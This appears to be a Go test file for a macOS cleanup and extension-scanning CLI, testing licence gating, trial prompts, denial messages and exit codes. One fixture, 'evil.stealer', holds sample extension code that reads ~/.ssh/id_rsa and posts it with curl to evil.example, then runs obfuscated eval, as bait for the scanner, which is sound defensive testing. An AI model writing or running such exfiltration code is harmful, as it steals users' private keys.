package main

import (
	"context"
	"crypto/ed25519"
	"crypto/sha256"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/shiva2021/rootout/internal/config"
	"github.com/shiva2021/rootout/internal/ext"
	"github.com/shiva2021/rootout/internal/fsx"
	"github.com/shiva2021/rootout/internal/license"
	"github.com/shiva2021/rootout/internal/plan"
	"github.com/shiva2021/rootout/internal/testutil"
)

// The test keypair matches internal/license/testkeys_test.go, which is test-only.
var (
	testSeed = sha256.Sum256([]byte("rootout-test-seed"))
	testPriv = ed25519.NewKeyFromSeed(testSeed[:])
	testPub  = testPriv.Public().(ed25519.PublicKey)
)

var testNow = time.Date(2026, 11, 1, 0, 0, 0, 0, time.UTC)

const ioregOut = `    "IOPlatformUUID" = "7A3F1C2E-1234-5678-9ABC-DEF012345678"`

// harness is a fake home, a fake Runner and a fake key service, wired into
// every seam the commands use. It resets the gate cache before and after.
type harness struct {
	env         fsx.Env
	mid         string
	runErr      error        // returned for ioreg when set
	trialStatus int          // /trial answer; 200 issues a trial key
	ioreg       atomic.Int32 // Resolve calls (each reads the machine id once)
	trial       atomic.Int32
	renew       atomic.Int32
	execs       atomic.Int32 // planExecute calls
	uninstalls  atomic.Int32 // extUninstall calls
	mu          sync.Mutex
	ran         []string // every command name the fake Runner saw
}

func newHarness(t *testing.T, spec testutil.Spec) *harness {
	t.Helper()
	env := testutil.FakeHome(t, spec)
	testutil.RequireSandbox(t, env)
	h := &harness{env: env, trialStatus: http.StatusOK}
	mid, err := license.MachineID(context.Background(), func(context.Context, string, ...string) ([]byte, error) {
		return []byte(ioregOut), nil
	})
	if err != nil {
		t.Fatal(err)
	}
	h.mid = mid
	srv := httptest.NewServer(http.HandlerFunc(h.serve))
	t.Cleanup(srv.Close)

	t.Setenv("ROOTOUT_LICENSE_FILE", filepath.Join(env.Home, ".config", "rootout", "license"))
	t.Setenv("ROOTOUT_CONFIG", filepath.Join(env.Home, ".config", "rootout", "config.toml"))

	oldDeps, oldEnv, oldRun, oldExec, oldUninst := gateDepsFn, realEnv, cmdRun, planExecute, extUninstall
	gateDepsFn = func(e fsx.Env, startTrial bool) license.Deps {
		d := gateDeps(e, startTrial)
		d.Run, d.Pub = h.run, testPub
		d.Now = func() time.Time { return testNow }
		d.Client.BaseURL = srv.URL
		d.Client.HTTP = &http.Client{Timeout: time.Second}
		return d
	}
	realEnv = func() (fsx.Env, error) { return env, nil }
	cmdRun = h.run
	planExecute = func(context.Context, fsx.Env, *plan.Plan, plan.Deps) (*plan.Result, error) {
		h.execs.Add(1)
		return &plan.Result{}, nil
	}
	extUninstall = func(context.Context, fsx.Env, ext.Extension, []ext.Editor, ext.Options) error {
		h.uninstalls.Add(1)
		return nil
	}
	resetGate()
	t.Cleanup(func() {
		gateDepsFn, realEnv, cmdRun, planExecute, extUninstall = oldDeps, oldEnv, oldRun, oldExec, oldUninst
		resetGate()
	})
	return h
}

func (h *harness) run(_ context.Context, name string, _ ...string) ([]byte, error) {
	h.mu.Lock()
	h.ran = append(h.ran, name)
	h.mu.Unlock()
	if name != "ioreg" {
		return nil, nil
	}
	h.ioreg.Add(1)
	if h.runErr != nil {
		return nil, h.runErr
	}
	return []byte(ioregOut), nil
}

func (h *harness) serve(w http.ResponseWriter, r *http.Request) {
	switch r.URL.Path {
	case "/trial":
		h.trial.Add(1)
		w.WriteHeader(h.trialStatus)
		if h.trialStatus == http.StatusOK {
			_ = json.NewEncoder(w).Encode(map[string]string{"key": h.sign(license.KindTrial, 7*24*time.Hour)})
		}
	case "/renew":
		h.renew.Add(1)
		w.WriteHeader(http.StatusServiceUnavailable)
	default:
		http.NotFound(w, r)
	}
}

// sign returns a key of kind for this Mac expiring exp after testNow (0 = admin, no expiry).
func (h *harness) sign(kind license.Kind, exp time.Duration) string {
	return signFor(kind, h.mid, exp)
}

func signFor(kind license.Kind, mid string, exp time.Duration) string {
	c := license.Claims{V: 1, Kind: kind, Sub: "12345678", MID: mid, IAT: testNow.Add(-time.Hour).Unix()}
	if exp != 0 {
		c.EXP = testNow.Add(exp).Unix()
		if c.EXP <= c.IAT {
			c.IAT = c.EXP - 3600
		}
	}
	k, err := license.Encode(c, testPriv)
	if err != nil {
		panic(err)
	}
	return k
}

// install saves key as this Mac's licence.
func (h *harness) install(t *testing.T, key string) {
	t.Helper()
	if err := (license.Store{Path: license.Path(h.env, os.Getenv)}).Save(key); err != nil {
		t.Fatal(err)
	}
}

// sawIoreg reports whether any licence check ran.
func (h *harness) sawIoreg() bool { return h.ioreg.Load() > 0 }

func TestGateAllowedCached(t *testing.T) {
	h := newHarness(t, testutil.Spec{})
	h.install(t, h.sign(license.KindAdmin, 0))
	ctx := context.Background()
	for i := range 2 {
		st, err := gate(ctx, h.env, false)
		if err != nil || st.Status != license.StatusAdmin {
			t.Fatalf("call %d: st=%+v err=%v", i, st, err)
		}
	}
	if n := h.ioreg.Load(); n != 1 {
		t.Fatalf("Resolve ran %d times, want 1", n)
	}
}

func TestGateCacheConcurrent(t *testing.T) {
	h := newHarness(t, testutil.Spec{})
	ctx := context.Background()
	var wg sync.WaitGroup
	for range 50 {
		wg.Go(func() {
			st, err := gate(ctx, h.env, false)
			if !errors.Is(err, ErrMembership) || st.Status != license.StatusNone {
				t.Errorf("st=%+v err=%v", st, err)
			}
		})
	}
	wg.Wait()
	if n := h.ioreg.Load(); n != 1 {
		t.Fatalf("Resolve ran %d times, want 1", n)
	}
	if n := h.trial.Load(); n != 0 {
		t.Fatalf("/trial called %d times, want 0", n)
	}
}

func TestGateNoneThenTrial(t *testing.T) {
	h := newHarness(t, testutil.Spec{})
	ctx := context.Background()
	st, err := gate(ctx, h.env, false)
	if !errors.Is(err, ErrMembership) || st.Status != license.StatusNone {
		t.Fatalf("first: st=%+v err=%v", st, err)
	}
	st, err = gate(ctx, h.env, true)
	if err != nil || st.Status != license.StatusTrial || !st.Started {
		t.Fatalf("trial: st=%+v err=%v", st, err)
	}
	if n := h.trial.Load(); n != 1 {
		t.Fatalf("/trial called %d times, want 1", n)
	}
	st, err = gate(ctx, h.env, false)
	if err != nil || st.Status != license.StatusTrial || st.Started {
		t.Fatalf("cached: st=%+v err=%v (Started must not repeat)", st, err)
	}
	if n := h.ioreg.Load(); n != 2 {
		t.Fatalf("Resolve ran %d times, want 2", n)
	}
}

func TestGateTrialUsedCached(t *testing.T) {
	h := newHarness(t, testutil.Spec{})
	h.trialStatus = http.StatusConflict
	ctx := context.Background()
	if _, err := gate(ctx, h.env, true); !errors.Is(err, ErrMembership) {
		t.Fatalf("err = %v", err)
	}
	if _, err := gate(ctx, h.env, true); !errors.Is(err, ErrMembership) {
		t.Fatalf("err = %v", err)
	}
	if n := h.trial.Load(); n != 1 {
		t.Fatalf("/trial called %d times, want 1", n)
	}
}

func TestGateTrialUnavailableRetried(t *testing.T) {
	h := newHarness(t, testutil.Spec{})
	h.trialStatus = http.StatusServiceUnavailable
	ctx := context.Background()
	for i := range 2 {
		st, err := gate(ctx, h.env, true)
		if !errors.Is(err, ErrMembership) || st.Status != license.StatusNone {
			t.Fatalf("call %d: st=%+v err=%v", i, st, err)
		}
	}
	if n := h.trial.Load(); n != 2 {
		t.Fatalf("/trial called %d times, want 2 (a failed start is never final)", n)
	}
	h.trialStatus = http.StatusOK
	if st, err := gate(ctx, h.env, true); err != nil || !st.Started {
		t.Fatalf("after the service recovered: st=%+v err=%v", st, err)
	}
}

func TestDenyLine(t *testing.T) {
	st := license.State{Status: license.StatusTrialUsed, MID: "0123456789abcdef0123456789abcdef"}
	want := "deletion and AI features are for members (trial used on this Mac) · rootout license"
	for name, err := range map[string]error{
		"membershipError": &membershipError{st: st},
		"denyExit":        denyExit(&membershipError{st: st}),
		"wrapped":         fmt.Errorf("x: %w", &membershipError{st: st}),
	} {
		if got := denyLine(err); got != want {
			t.Errorf("%s: denyLine = %q, want %q", name, got, want)
		}
	}
	if got := denyLine(errors.New("boom\nmore")); got != "boom" {
		t.Errorf("other error: denyLine = %q, want first line", got)
	}
}

func TestGateMachineIDError(t *testing.T) {
	h := newHarness(t, testutil.Spec{})
	h.runErr = errors.New("ioreg: boom")
	_, err := gate(context.Background(), h.env, false)
	if !errors.Is(err, ErrMembership) {
		t.Fatalf("err = %v, want ErrMembership", err)
	}
	if !strings.Contains(err.Error(), "could not read this Mac's id") {
		t.Fatalf("message:\n%s", err)
	}
}

func TestMembershipErrorMessage(t *testing.T) {
	const mid = "0123456789abcdef0123456789abcdef"
	tests := []struct {
		name   string
		st     license.State
		detail string
	}{
		{"trial used", license.State{Status: license.StatusTrialUsed, MID: mid}, "trial used on this Mac"},
		{"no key", license.State{Status: license.StatusNone, MID: mid, Reason: "no key installed"}, "no key"},
		{"offline", license.State{Status: license.StatusNone, MID: mid, Reason: "starting the trial needs the network once"}, "no key · starting the trial needs the network once"},
		{"expired", license.State{Status: license.StatusExpired, MID: mid, Expires: time.Date(2026, 11, 6, 0, 0, 0, 0, time.UTC), Reason: "membership expired 2026-11-06"}, "expired 2026-11-06"},
		{"expired denied", license.State{Status: license.StatusExpired, MID: mid, Expires: time.Date(2026, 11, 6, 0, 0, 0, 0, time.UTC),
			Reason: "membership expired 2026-11-06: membership check failed: declined_patron"}, "expired 2026-11-06 · declined_patron"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			err := error(&membershipError{st: tc.st})
			want := "deletion and AI features are for members (" + tc.detail + ").\n" +
				"  Already a member? get your key at " + license.ServiceURL + "/?m=" + mid + "\n" +
				"  then run: rootout license <key>\n" +
				"  Not yet? the same page links to the membership."
			if err.Error() != want {
				t.Fatalf("message:\n%s\nwant:\n%s", err, want)
			}
			if !errors.Is(err, ErrMembership) {
				t.Fatal("membershipError must match ErrMembership")
			}
			if strings.Contains(strings.ToLower(err.Error()), "patreon") {
				t.Fatal("no Patreon URL in the binary")
			}
		})
	}
}

func TestDenyExit(t *testing.T) {
	err := denyExit(&membershipError{st: license.State{Status: license.StatusTrialUsed}})
	if !isExit(err, exitLicensing) {
		t.Fatalf("denyExit = %#v, want exit %d", err, exitLicensing)
	}
	other := errors.New("boom")
	if got := denyExit(other); !errors.Is(got, other) {
		t.Fatalf("denyExit(other) = %v", got)
	}
}

func TestTrialNotice(t *testing.T) {
	var b strings.Builder
	trialNotice(license.State{Status: license.StatusTrial}, &b)
	if b.Len() != 0 {
		t.Fatalf("no notice without Started, got %q", b.String())
	}
	trialNotice(license.State{Status: license.StatusTrial, Started: true, Expires: time.Date(2026, 11, 6, 0, 0, 0, 0, time.UTC)}, &b)
	if b.String() != "7-day trial started · ends 2026-11-06\n" {
		t.Fatalf("notice = %q", b.String())
	}
}

func TestConfirmTrial(t *testing.T) {
	for in, want := range map[string]bool{"y\n": true, "Y\n": true, "n\n": false, "\n": false, "": false, "yes\n": false} {
		var out strings.Builder
		if got := confirmTrial(strings.NewReader(in), &out); got != want {
			t.Errorf("confirmTrial(%q) = %v, want %v", in, got, want)
		}
		if out.String() != "Start your free 7-day trial? [y/N] " {
			t.Errorf("prompt = %q", out.String())
		}
	}
}

func TestConfirmTrialLeavesRestOfInput(t *testing.T) {
	r := strings.NewReader("y\ndelete\n")
	if !confirmTrial(r, &strings.Builder{}) {
		t.Fatal("want yes")
	}
	rest := make([]byte, 16)
	n, _ := r.Read(rest)
	if string(rest[:n]) != "delete\n" {
		t.Fatalf("confirmTrial consumed the next line; rest = %q", rest[:n])
	}
}

func TestLicenseStatusLine(t *testing.T) {
	day := 24 * time.Hour
	tests := []struct {
		name string
		key  func(h *harness) string
		want string
	}{
		{"none", func(*harness) string { return "" }, ""},
		{"admin", func(h *harness) string { return h.sign(license.KindAdmin, 0) }, "admin"},
		{"member", func(h *harness) string { return h.sign(license.KindPatron, 30*day) }, "member"},
		{"grace", func(h *harness) string { return h.sign(license.KindPatron, -2*day) }, "member"},
		{"trial", func(h *harness) string { return h.sign(license.KindTrial, 5*day) }, "trial: 5 days left"},
		{"last trial day", func(h *harness) string { return h.sign(license.KindTrial, day) }, "trial: 1 day left"},
		{"expired trial", func(h *harness) string { return h.sign(license.KindTrial, -day) }, membersOnly},
		{"invalid", func(*harness) string { return "ro1.garbage.sig" }, membersOnly},
		{"other mac", func(*harness) string { return signFor(license.KindAdmin, "ffffffffffffffffffffffffffffffff", 0) }, membersOnly},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			h := newHarness(t, testutil.Spec{})
			if k := tc.key(h); k != "" {
				h.install(t, k)
			}
			if got := licenseStatusLine(context.Background(), h.env); got != tc.want {
				t.Fatalf("status line = %q, want %q", got, tc.want)
			}
			if h.renew.Load()+h.trial.Load() != 0 {
				t.Fatal("the status line must not reach the network")
			}
		})
	}
}

// runCLI runs rootout with args, stdin fed from in, and returns the exit code
// and what went to stdout and stderr. It swaps the os streams, so callers
// must not run in parallel.
func runCLI(t *testing.T, in string, args ...string) (code int, stdout, stderr string) {
	t.Helper()
	dir := t.TempDir()
	file := func(name, content string) *os.File {
		p := filepath.Join(dir, name)
		if err := os.WriteFile(p, []byte(content), 0o600); err != nil {
			t.Fatal(err)
		}
		f, err := os.OpenFile(p, os.O_RDWR, 0)
		if err != nil {
			t.Fatal(err)
		}
		t.Cleanup(func() { _ = f.Close() })
		return f
	}
	si, so, se := file("in", in), file("out", ""), file("err", "")
	oldIn, oldOut, oldErr := os.Stdin, os.Stdout, os.Stderr
	os.Stdin, os.Stdout, os.Stderr = si, so, se
	code = runMain(args)
	os.Stdin, os.Stdout, os.Stderr = oldIn, oldOut, oldErr
	read := func(name string) string {
		b, err := os.ReadFile(filepath.Join(dir, name))
		if err != nil {
			t.Fatal(err)
		}
		return string(b)
	}
	return code, read("out"), read("err")
}

// appSpec is a fake home with one removable app and an orphaned leftover.
func appSpec() testutil.Spec {
	return testutil.Spec{
		Apps: []testutil.App{{Path: "~/Applications/Foo.app", BundleID: "com.foo.app"}},
		Files: map[string]string{
			"~/Library/Preferences/com.foo.app.plist":  "prefs",
			"~/Library/Preferences/com.gone.app.plist": "old prefs",
			"~/Library/Caches/com.gone.app/cache.db":   "old cache",
		},
	}
}

// extSpec is a fake home with one risky VS Code extension.
func extSpec() testutil.Spec {
	const dir = "~/.vscode/extensions/evil.stealer-1.0.0/"
	return testutil.Spec{Files: map[string]string{
		dir + "package.json": `{"name":"stealer","publisher":"evil","version":"1.0.0","main":"./extension.js","activationEvents":["*"]}`,
		dir + "extension.js": `const cp=require('child_process');const k=require('fs').readFileSync(process.env.HOME+'/.ssh/id_rsa');cp.exec('curl -d '+k+' http://evil.example');eval(atob('eA=='));`,
	}}
}

const (
	deniedTrialUsed     = "deletion and AI features are for members (trial used on this Mac)."
	deniedTrialUsedLine = "deletion and AI features are for members (trial used on this Mac) · rootout license"
)

func wantDenied(t *testing.T, h *harness, code int, stderr, detail string) {
	t.Helper()
	if code != exitLicensing {
		t.Fatalf("exit = %d, want %d; stderr:\n%s", code, exitLicensing, stderr)
	}
	for _, want := range []string{"rootout: " + detail, keysURL(h.mid), "then run: rootout license <key>"} {
		if !strings.Contains(stderr, want) {
			t.Fatalf("stderr lacks %q:\n%s", want, stderr)
		}
	}
	if n := h.execs.Load(); n != 0 {
		t.Fatalf("plan executed %d times after a denial", n)
	}
}

func TestListFreeWithoutKey(t *testing.T) {
	h := newHarness(t, appSpec())
	code, out, stderr := runCLI(t, "", "list", "--json")
	if code != 0 || !strings.Contains(out, "com.foo.app") {
		t.Fatalf("exit %d, stdout %q, stderr %q", code, out, stderr)
	}
	if h.sawIoreg() {
		t.Fatal("list must not check the licence")
	}
}

func TestRemoveDryRunFreeWithoutKey(t *testing.T) {
	h := newHarness(t, appSpec())
	code, out, stderr := runCLI(t, "", "remove", "Foo", "--dry-run")
	if code != 0 || !strings.Contains(out, "com.foo.app.plist") {
		t.Fatalf("exit %d, stdout %q, stderr %q", code, out, stderr)
	}
	if h.sawIoreg() || h.trial.Load() != 0 {
		t.Fatal("a dry run must not check the licence")
	}
}

func TestRemoveDeniedExit4(t *testing.T) {
	h := newHarness(t, appSpec())
	h.trialStatus = http.StatusConflict
	code, _, stderr := runCLI(t, "", "remove", "Foo", "--yes", "--no-brew")
	wantDenied(t, h, code, stderr, deniedTrialUsed)
	if h.trial.Load() != 1 {
		t.Fatalf("/trial called %d times, want 1", h.trial.Load())
	}
}

func TestRemoveJSONDenied(t *testing.T) {
	h := newHarness(t, appSpec())
	h.install(t, h.sign(license.KindTrial, -24*time.Hour))
	code, out, stderr := runCLI(t, "", "remove", "Foo", "--yes", "--no-brew", "--json")
	wantDenied(t, h, code, stderr, "deletion and AI features are for members (expired 2026-10-31).")
	if out != "" {
		t.Fatalf("stdout must stay empty under --json, got %q", out)
	}
}

func TestRemoveTrialPromptNo(t *testing.T) {
	h := newHarness(t, appSpec())
	code, _, stderr := runCLI(t, "n\n", "remove", "Foo", "--no-brew")
	if code != exitDeclined || !strings.Contains(stderr, "Start your free 7-day trial? [y/N] ") || !strings.Contains(stderr, "nothing removed") {
		t.Fatalf("exit %d, stderr:\n%s", code, stderr)
	}
	if h.trial.Load() != 0 || h.execs.Load() != 0 {
		t.Fatalf("trial %d, execs %d after declining", h.trial.Load(), h.execs.Load())
	}
}

func TestRemoveTrialYesStarts(t *testing.T) {
	h := newHarness(t, appSpec())
	code, _, stderr := runCLI(t, "", "remove", "Foo", "--yes", "--no-brew")
	if code != 0 {
		t.Fatalf("exit %d, stderr:\n%s", code, stderr)
	}
	if h.trial.Load() != 1 || h.execs.Load() != 1 {
		t.Fatalf("trial %d, execs %d, want 1 and 1", h.trial.Load(), h.execs.Load())
	}
	if !strings.Contains(stderr, "7-day trial started · ends 2026-11-08") || strings.Contains(stderr, "Start your free") {
		t.Fatalf("stderr:\n%s", stderr)
	}
}

func TestRemoveMemberNeverPrompted(t *testing.T) {
	h := newHarness(t, appSpec())
	h.install(t, h.sign(license.KindPatron, 30*24*time.Hour))
	code, _, stderr := runCLI(t, "\n", "remove", "Foo", "--no-brew")
	if code != exitDeclined || strings.Contains(stderr, "Start your free") {
		t.Fatalf("exit %d, stderr:\n%s", code, stderr)
	}
	if h.trial.Load() != 0 || h.execs.Load() != 0 {
		t.Fatal("a member must not reach /trial, and an empty confirmation removes nothing")
	}
}

func TestOrphansListFreeWithoutKey(t *testing.T) {
	for _, args := range [][]string{{"orphans", "--dry-run"}, {"orphans", "--json"}} {
		h := newHarness(t, appSpec())
		code, out, stderr := runCLI(t, "", args...)
		if code != 0 || !strings.Contains(out, "com.gone.app") {
			t.Fatalf("%v: exit %d, stdout %q, stderr %q", args, code, out, stderr)
		}
		if h.sawIoreg() {
			t.Fatalf("%v must not check the licence", args)
		}
	}
}

func TestOrphansRemoveDenied(t *testing.T) {
	h := newHarness(t, appSpec())
	h.trialStatus = http.StatusConflict
	code, _, stderr := runCLI(t, "", "orphans", "--remove", "com.gone.app", "--yes")
	wantDenied(t, h, code, stderr, deniedTrialUsed)
}

func TestScanHeuristicsFreeWithoutKey(t *testing.T) {
	h := newHarness(t, extSpec())
	code, out, stderr := runCLI(t, "", "scan", "--no-tui", "--all")
	if code != 0 || !strings.Contains(out, "evil.stealer") {
		t.Fatalf("exit %d, stdout %q, stderr %q", code, out, stderr)
	}
	if h.sawIoreg() {
		t.Fatal("a heuristics scan must not check the licence")
	}
}

func TestScanLLMDeniedExit4(t *testing.T) {
	h := newHarness(t, extSpec())
	c := config.Default()
	c.LLM.Provider, c.LLM.Ollama.Model = "ollama", "llama3.2"
	c.LLM.Ollama.BaseURL = "http://127.0.0.1:1" // never reached
	if err := config.Save(os.Getenv("ROOTOUT_CONFIG"), c); err != nil {
		t.Fatal(err)
	}
	code, out, stderr := runCLI(t, "", "scan", "--no-tui", "--all", "--llm")
	if !strings.Contains(out, "evil.stealer") {
		t.Fatalf("heuristics must still print; stdout %q", out)
	}
	if strings.Contains(stderr, "asking the model") {
		t.Fatalf("the model must not be asked without membership:\n%s", stderr)
	}
	wantDenied(t, h, code, stderr, "deletion and AI features are for members (no key).")
	if h.trial.Load() != 0 {
		t.Fatal("the AI path must never start the trial")
	}
}

func TestScanUninstallDenied(t *testing.T) {
	h := newHarness(t, extSpec())
	h.trialStatus = http.StatusConflict
	code, _, stderr := runCLI(t, "", "scan", "--uninstall", "evil.stealer", "--yes")
	wantDenied(t, h, code, stderr, deniedTrialUsed)
	if n := h.uninstalls.Load(); n != 0 || !testutil.Exists(h.env, "~/.vscode/extensions/evil.stealer-1.0.0/package.json") {
		t.Fatalf("uninstalled %d extension(s) despite the denial", n)
	}
}

func TestScanUninstallAllowed(t *testing.T) {
	h := newHarness(t, extSpec())
	h.install(t, h.sign(license.KindAdmin, 0))
	code, _, stderr := runCLI(t, "", "scan", "--uninstall", "evil.stealer", "--yes")
	if code != 0 || h.uninstalls.Load() != 1 {
		t.Fatalf("exit %d, uninstalls %d; stderr:\n%s", code, h.uninstalls.Load(), stderr)
	}
}
